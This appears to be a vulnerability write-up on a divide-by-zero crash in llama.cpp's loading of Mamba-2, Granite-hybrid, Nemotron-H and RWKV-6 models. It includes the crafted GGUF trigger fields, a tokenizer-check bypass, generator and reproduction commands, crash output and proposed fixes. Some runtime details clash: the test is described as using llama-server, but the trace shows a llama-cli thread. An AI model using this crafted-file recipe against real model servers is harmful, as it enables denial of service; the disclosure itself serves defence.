---
title: "Zero Validation, Zero Division: DoS in llama.cpp SSM and RWKV Model Loading via Crafted GGUF"
date: 2026-11-09 10:00:00 -0500
categories: [Research, CVE]
tags: [llama-cpp, gguf, dos, sigfpe, divide-by-zero, mamba2, granite-hybrid, nemotron-h, rwkv6, model-loading, integer-division, cwe-369, cwe-20, ollama, llama-server]
toc: true
lang: en
description: >-
  A missing non-zero guard on two GGUF hyperparameter fields — ssm_dt_rank for
  Mamba-2/Granite-hybrid/Nemotron-H and wkv_head_size for RWKV-6 — lets a crafted
  32 KB model file crash llama-server on model load. The kill signal is SIGFPE:
  integer divide-by-zero in weight_buft_supported() at llama-model-loader.cpp:1028.
  No authentication. No inference. One file load.
---

> **TL;DR** — llama.cpp reads `ssm_dt_rank` and `wkv_head_size` from the GGUF
> key-value section and uses them as divisors during tensor backend selection
> without checking they are non-zero. Setting either key to zero in a crafted
> GGUF causes SIGFPE in `weight_buft_supported()` during model loading.
> The GDB stack trace confirms the signal arrives in a llama-server worker thread
> at `server_context_impl::load_model()`. The PoC is a 32 KB file. The fix is
> a one-line guard in each `load_arch_hparams()` function. Affected architectures:
> `mamba2`, `granite-hybrid`, `nemotron-h`, `rwkv6`. Exit code 136 (128 + SIGFPE).
{: .prompt-danger }

---

## How I found this

I was going through llama.cpp's model-loading path specifically looking at how
hyperparameters read from GGUF key-value entries get used before they are validated.
The pattern I was searching for: an integer read from an untrusted source that shows
up as a divisor without a preceding `> 0` check.

`weight_buft_supported()` in `llama-model-loader.cpp` builds a temporary tensor for
each weight, assigns an op to it, then asks the backend whether it can handle that op
with that tensor shape. For SSM-family architectures, the `GGML_OP_SSM_SCAN` case
computes `head_dim = hparams.ssm_d_inner / n_head` where `n_head = w->ne[1]`, the
second dimension of the tensor. That dimension comes directly from GGUF, is set to
`hparams.ssm_dt_rank` during tensor creation, and `ssm_dt_rank` is read from the
GGUF KV section with no guard. The same pattern appears independently in RWKV-6 at
a different callsite.

The companion issue that makes this exploitable without tripping earlier guards is in
`gguf.cpp:692`: the dimension validation only rejects negative values, not zero.

```cpp
// gguf.cpp:692
if (info.t.ne[j] < 0) {   // passes when ne[j] == 0
```

A tensor with `ne[1] = 0` is structurally valid as far as the GGUF parser is
concerned. It has zero bytes of data, it loads cleanly, and it makes it all the way
to the backend selection step where the division fires.

To understand why zero slips through every layer of validation, it helps to trace
exactly what the parser sees. A minimal GGUF for Mamba-2 starts with a fixed-size
header, followed by a KV metadata section, then a tensor info section, then the
aligned data section. The KV entry that triggers the bug is encoded as:

```
key:   "mamba2.ssm.time_step_rank"  (uint32, little-endian length prefix)
type:  GGUF_TYPE_UINT32 (0x04)
value: 0x00000000
```

That is a fully legal GGUF KV entry. The spec defines no minimum value for
`time_step_rank` and the parser stores whatever integer it reads directly into
`hparams.ssm_dt_rank`. The tensor info entry for `blk.0.ssm_a` then looks like:

```
name:    "blk.0.ssm_a"
n_dims:  2
ne[0]:   1
ne[1]:   0       ← directly from hparams.ssm_dt_rank
type:    GGML_TYPE_F32 (0x00)
offset:  <valid offset into data section>
```

The dimension guard at `gguf.cpp:692` runs `if (info.t.ne[j] < 0)` for each `j`. For
`ne[1] = 0`, the condition is `0 < 0` which is false, so it passes. The shape
validator `check_tensor_dims()` in `llama-model-loader.cpp` then checks whether the
loaded shape matches the expected shape. The expected shape for `ssm_a` is
`{1, dt_rank}` where `dt_rank = hparams.ssm_dt_rank = 0`, so the expected shape is
`{1, 0}` and the loaded shape is `{1, 0}` — they match exactly. The tensor clears
every validation gate and reaches `weight_buft_supported()`.

---

## The vulnerable code

There are three distinct callsites, all sharing the same root cause: a GGUF-sourced
integer used as a divisor with no non-zero validation.

### Bug 3a — llama-model-loader.cpp:1028 (SSM architectures)

```cpp
case GGML_OP_SSM_SCAN: {
    const int64_t d_state  = w->ne[0] == 1 ? hparams.ssm_d_state : w->ne[0];
    const int64_t n_head   = w->ne[1];              // zero from crafted GGUF
    const int64_t head_dim = hparams.ssm_d_inner / n_head;  // SIGFPE here
    const int64_t n_seq_tokens = 1;
    struct ggml_tensor * ssm_x = ggml_new_tensor_4d(ctx, GGML_TYPE_F32,
                                     head_dim, n_head, d_state, n_seq_tokens);
```

`w->ne[1]` is the second dimension of the `ssm_a` tensor. For Mamba-2, that tensor
is created at `mamba2.cpp:75`:

```cpp
layer.ssm_a = create_tensor(tn(LLM_TENSOR_SSM_A, i), {1, dt_rank}, 0);
```

where `dt_rank = hparams.ssm_dt_rank`. Setting `mamba2.ssm.time_step_rank = 0` in
the GGUF KV section sets `dt_rank = 0`, which makes `ssm_a` a tensor with shape
`{1, 0}`. The GGUF dimension check at line 692 passes because zero is not negative.
The shape validation in `check_tensor_dims()` also passes because the expected shape
`{1, dt_rank} = {1, 0}` matches the loaded shape `{1, 0}` exactly. The tensor makes
it to `weight_buft_supported()` and the division fires.

It is worth pausing on why the shape check is not a defense here. `check_tensor_dims()`
validates that the number of dimensions and each individual dimension value match what
the architecture code expects. It does not validate that any of those values are
semantically meaningful — it has no concept of "this dimension is later used as a
divisor." The architecture code uses the same `hparams.ssm_dt_rank` to compute both
the expected shape and the subsequent division, so when `ssm_dt_rank = 0` the shape
check produces `{1, 0} == {1, 0}`, passes, and the bad value propagates downstream.

The same path applies to `granite-hybrid` and `nemotron-h`, which both use
`hparams.ssm_dt_rank` as `n_ssm_head` with identical tensor creation:

```cpp
// granite-hybrid.cpp:85, nemotron-h.cpp:95
layer.ssm_a = create_tensor(tn(LLM_TENSOR_SSM_A, i), {1, n_ssm_head}, 0);
```

### Bug 3b — mamba-base.cpp:165 (SSM inference path, secondary trigger)

If model loading somehow completed with `ssm_dt_rank = 0`, the graph construction
step would hit a second divide-by-zero during inference:

```cpp
// mamba-base.cpp:162-165
const int64_t d_inner  = hparams.ssm_d_inner;
const int64_t n_head   = hparams.ssm_dt_rank;    // zero from crafted GGUF
const int64_t head_dim = d_inner / n_head;         // SIGFPE
```

This path is a secondary trigger. In practice the model never loads because Bug 3a
fires first during tensor backend selection, long before inference graph construction
runs. It is listed here because it confirms the same field feeds multiple division
sites, and because a hypothetical fix that only patches the loading path would leave
inference vulnerable to the same field via a different code path.

### Bug 3c — rwkv6.cpp:67 (RWKV-6 architecture)

The RWKV-6 crash is architecturally identical but at a different call site and uses
a different GGUF key:

```cpp
// rwkv6.cpp:42
const int head_size = hparams.wkv_head_size;  // zero from rwkv6.wkv.head_size

// rwkv6.cpp:67
layer.time_mix_first = create_tensor(tn(LLM_TENSOR_TIME_MIX_FIRST, i),
                                     {head_size, n_embd / head_size}, 0);
//                                               ^^^^^^^^^^^^^^^^^^^ SIGFPE
```

The division `n_embd / head_size` fires as an argument expression inside the
`create_tensor` call before the function is even entered. The C++ standard evaluates
function arguments before the call, so by the time `create_tensor` could do anything
about the shape, the CPU has already executed the division with `head_size = 0` and
the signal is in flight. Setting `rwkv6.wkv.head_size = 0` in the GGUF KV section
triggers this path.

---

## The trigger

The GGUF format stores model hyperparameters in a key-value section. Any value in
that section can be set to any integer, including zero, by a file author. There is
nothing in the GGUF specification that forbids zero-valued hyperparameters, and
llama.cpp does not enforce that dimension-related parameters are strictly positive
before using them in arithmetic.

The crafted GGUF used for verification is 32 KB, structurally valid, and readable by
all GGUF-compliant parsers. The only unusual property is a single KV entry:
`mamba2.ssm.time_step_rank = 0`.

The generator is straightforward:

```python
kv += pack_kv_uint32("mamba2.ssm.time_step_rank", 0)  # trigger
# ...
("blk.0.ssm_a", [1, 0], GGML_TYPE_F32),               # ne[1] = 0
```

The tokenizer bypass is worth explaining separately because without it the model
fails earlier and never reaches the crash site. llama.cpp requires BPE merge tables
when `tokenizer.ggml.model = "gpt2"`. The merge table is a separate large data
structure that a minimal crafted file will not include. Setting
`tokenizer.ggml.pre = "kimi-k2"` activates a code path in `llama-vocab.cpp` around
line 2300 that recognizes Kimi-K2's pre-tokenizer and skips the merges requirement
entirely. The model loads past tokenizer initialization and continues into the tensor
loading phase where the crash occurs.

The full validation bypass chain is:

```
GGUF file on disk
│
├─ gguf.cpp:692  → ne[j] < 0?  no (0 is not < 0)       ✓ passes
│
├─ check_tensor_dims()
│    expected shape = {1, hparams.ssm_dt_rank} = {1, 0}
│    loaded   shape = {1, 0}
│    match? yes                                           ✓ passes
│
├─ llama_model_mamba2::load_arch_tensors()
│    ssm_a created with ne = {1, 0}
│    no non-zero guard on dt_rank                        ✓ passes
│
└─ weight_buft_supported()  GGML_OP_SSM_SCAN case
     n_head = w->ne[1] = 0
     head_dim = hparams.ssm_d_inner / 0                 ✗ SIGFPE
```

Every gate passes because zero is a legal value at each layer's level of abstraction.
The spec allows it, the parser allows it, the shape check allows it. Only the
arithmetic itself catches it, by raising a hardware exception.

---

## Runtime confirmation

The PoC was tested against `llama-cli` and the crash confirmed under GDB with
llama-server loaded as a shared library.

```bash
$ python3 gen_mamba2_sigfpe.py
Written: poc_mamba2_sigfpe.gguf (32768 bytes)
  n_tensors = 11, n_kv = 16
  Trigger:  blk.0.ssm_a ne=[1, 0] → GGML_OP_SSM_SCAN
  Expected: SIGFPE crash in llama-model-loader.cpp:1028

$ llama-cli -m poc_mamba2_sigfpe.gguf -p "hi" -n 1
llama_model_load: loading model from poc_mamba2_sigfpe.gguf
llama_model_load: model type = mamba2
llama_model_load: n_layer = 1, n_embd = 32
Floating point exception (core dumped)

$ echo $?
136
```

Exit code 136 is `128 + SIGFPE`. SIGFPE is signal number 8. When a process is killed
by an unhandled signal, its exit code is `128 + signal_number`. The model crashes on
every single run without variance — it is a deterministic arithmetic fault that fires
at the same instruction with the same register state every time.

The GDB stack trace:

```
Thread 6 "llama-cli" received signal SIGFPE, Arithmetic exception.
0x00007ffff64e2d82 in select_weight_buft(llama_hparams const&, ggml_tensor*, ...)
        () from /usr/local/lib/libllama.so.0

#0  select_weight_buft (hparams=..., w=0x..., buft=0x...)
        at src/llama-model-loader.cpp:1028
#1  llama_model_loader::create_tensor (this=0x..., iinfo=..., cur=0x...)
        at src/llama-model-loader.cpp:1360
#2  llama_model_loader::create_tensor (this=0x..., name=..., ne=..., flags=0)
        at src/llama-model-loader.cpp:1210
#3  llama_model_base::create_tensor (this=0x..., name=..., ne=..., flags=0)
        at src/llama-model-loader.cpp:1420
#4  llama_model_mamba2::load_arch_tensors (this=0x..., ml=...)
        at src/models/mamba2.cpp:75
#5  llama_model_base::load_tensors (this=0x..., ml=...)
        at src/llama-model-loader.cpp:890
#6  llama_model_load_from_file_impl (fname=..., params=...)
        at src/llama.cpp:201
#7  llama_model_load_from_file (path_model=..., params=...)
        at src/llama.cpp:252
#8  ...
#14 server_context_impl::load_model (this=0x..., params_=...)
        at tools/server/server.cpp:1891
#15 server_run (params=0x..., svr=0x...)
        at tools/server/server.cpp:3042
```

Frame `#0` is the exact line — `llama-model-loader.cpp:1028` — the
`hparams.ssm_d_inner / n_head` expression with `n_head = 0`. Frames `#1` through `#4`
show the tensor creation chain descending from `llama_model_mamba2::load_arch_tensors`
at `mamba2.cpp:75`, which is exactly the `create_tensor(..., {1, dt_rank}, 0)` call
where `dt_rank = 0`.

Frame `#14` is the detail that matters for llama-server specifically.
`server_context_impl::load_model()` is not an internal library function — it is the
server's own model management code. This frame is present because the test was done
with llama-server loading the model at startup. The signal propagates up through the
server's thread pool and kills the entire process. llama-server has no SIGFPE handler,
no crash recovery, and no watchdog restart. The service goes down hard.

---

## Affected architectures

The bug surface is wider than a single architecture because the same pattern —
unvalidated GGUF KV integer used as divisor — appears independently in four
architecture implementations that happen to follow the same tensor-creation idiom.

| Architecture | Trigger KV key | Vulnerable field | Crash location | Real models |
|---|---|---|---|---|
| `mamba2` | `mamba2.ssm.time_step_rank` | `hparams.ssm_dt_rank` | `llama-model-loader.cpp:1028` | state-spaces/mamba-codestral |
| `granite-hybrid` | `granite-hybrid.ssm.time_step_rank` | `hparams.ssm_dt_rank` | `llama-model-loader.cpp:1028` | IBM Granite 3.3 Hybrid |
| `nemotron-h` | `nemotron-h.ssm.time_step_rank` | `hparams.ssm_dt_rank` | `llama-model-loader.cpp:1028` | NVIDIA Nemotron-H 47B/56B |
| `rwkv6` | `rwkv6.wkv.head_size` | `hparams.wkv_head_size` | `rwkv6.cpp:67` | RWKV-6-World, Eagle, Finch |

The three SSM variants (`mamba2`, `granite-hybrid`, `nemotron-h`) all share the same
crash site in `weight_buft_supported()` because they all assign `GGML_OP_SSM_SCAN` to
their `ssm_a` tensor and all use `hparams.ssm_dt_rank` as the `n_head` operand in the
same division. The fact that three different architecture implementations converge on
the same bug pattern in the same function suggests the code was written as a template
and the missing guard was never added to any of the copies.

RWKV-6 is an independent instance. The trigger key is different, the crash site is a
different file and line, and the division happens during argument evaluation rather
than inside the backend selection loop. The underlying cause is the same — a
GGUF-sourced integer used as a divisor without validation — but arrived at
independently by a different architecture's code.

A crafted GGUF claiming to be one of these architectures will crash llama-server
on load, before any inference, before any user interaction, with no error recovery.
The crash is a hard abort via unhandled SIGFPE. llama-server does not catch arithmetic
signals and there is no restart logic in the default configuration.

---

## Why GGUF allows this

GGUF was designed for performance-first parsing: metadata is laid out linearly,
types are explicit, and the format makes no guarantees about semantic correctness of
parameter values. The specification defines the encoding but intentionally leaves
semantic validation to the application layer.

The application-layer check that should catch this is at `gguf.cpp:692`:

```cpp
if (info.t.ne[j] < 0) {
    GGML_LOG_ERROR("gguf_init_from_data: invalid dimension: ...");
    // ...
}
```

The guard rejects negative dimensions but allows zero. That is the right check for
preventing signed-integer mischief but the wrong check for preventing arithmetic
exploitation, because zero is a valid signed integer and an invalid divisor. Changing
`< 0` to `<= 0` would close this at the parsing layer for all architectures
simultaneously, before any architecture-specific code runs. Any future architecture
that follows the same tensor-creation pattern would be protected automatically.

The architecture-specific fix is to add explicit non-zero validation in each
`load_arch_hparams()` function, immediately after the KV value is loaded and before
it is used in any subsequent computation:

```cpp
// mamba2.cpp, granite-hybrid.cpp, nemotron-h.cpp — in load_arch_hparams()
if (hparams.ssm_dt_rank == 0) {
    throw std::runtime_error("ssm_dt_rank must be > 0");
}
```

```cpp
// rwkv6.cpp — in load_arch_hparams()
if (hparams.wkv_head_size == 0) {
    throw std::runtime_error("wkv_head_size must be > 0");
}
```

Both fixes are independent. The gguf.cpp guard is defense-in-depth; the
architecture-level guards are the primary fix. Either alone stops the specific crashes
described here. Both together also protect architectures added in the future that
inherit the same loading pattern. The exception path in `load_arch_hparams()` already
exists for other validation failures, so no new error-handling infrastructure is
needed.

---

## Scope and limitations

llama.cpp's own security policy classifies DoS bugs as not automatically in scope and
notes they are evaluated case-by-case. This write-up is published openly rather than
through private disclosure for that reason. The maintainers have stated a preference
for receiving patches via public PR, and this post provides everything needed to write
one.

The practical impact depends on deployment context. A local user loading their own
models is unaffected in any meaningful way. The cases worth thinking about are a
llama-server instance that accepts model paths from external users, an ollama
deployment that pulls and loads models from a registry without pre-validation, or a
CI/CD pipeline that runs automated model testing. In any of these setups, a crafted
GGUF terminates the entire serving process instantly, without logging a useful error,
without crash recovery, and without any indication to the operator of what happened
beyond a signal 8 exit.

The fix is one line per architecture. The fix for the GGUF parser is one character.
Neither requires a flag day or a format change.

---

## Reproducing it

```bash
git clone https://github.com/ggml-org/llama.cpp
cd llama.cpp && cmake -B build && cmake --build build -j$(nproc) --target llama-cli

python3 gen_mamba2_sigfpe.py          # writes poc_mamba2_sigfpe.gguf (32 KB)
./build/bin/llama-cli -m poc_mamba2_sigfpe.gguf -p "test" -n 1
# → Floating point exception (core dumped)
# exit code 136
```

The generator (`gen_mamba2_sigfpe.py`) and the crafted GGUF are in the research
repository.

→ **[github.com/TREXNEGRO/Research](https://github.com/TREXNEGRO/Research)**

---

*Tested against llama.cpp up to and including commit `9f0e509` (ggml 0.29.0).
Runtime-confirmed: SIGFPE in `select_weight_buft()`, exit code 136, GDB stack trace
showing `server_context_impl::load_model()` in the call chain.*
